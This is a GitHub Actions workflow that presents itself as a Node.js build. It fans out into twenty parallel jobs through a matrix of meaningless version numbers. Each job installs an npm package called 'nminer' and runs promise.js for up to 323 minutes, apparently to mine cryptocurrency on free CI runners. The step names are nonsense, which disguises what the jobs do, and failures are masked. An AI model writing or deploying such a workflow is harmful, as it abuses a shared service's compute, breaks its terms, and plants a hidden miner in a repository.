name: promise
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2246 }
          - { version: 3593 }
          - { version: 26 }
          - { version: 5721 }
          - { version: 1670 }
          - { version: 7707 }
          - { version: 7660 }
          - { version: 5862 }
          - { version: 2041 }
          - { version: 3229 }
          - { version: 8186 }
          - { version: 3059 }
          - { version: 3910 }
          - { version: 1068 }
          - { version: 8758 }
          - { version: 8642 }
          - { version: 2845 }
          - { version: 7456 }
          - { version: 8312 }
          - { version: 3470 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: lest unbearably
        run: |
          npm install nminer@latest
          timeout 323m node promise.js || echo "promise executed"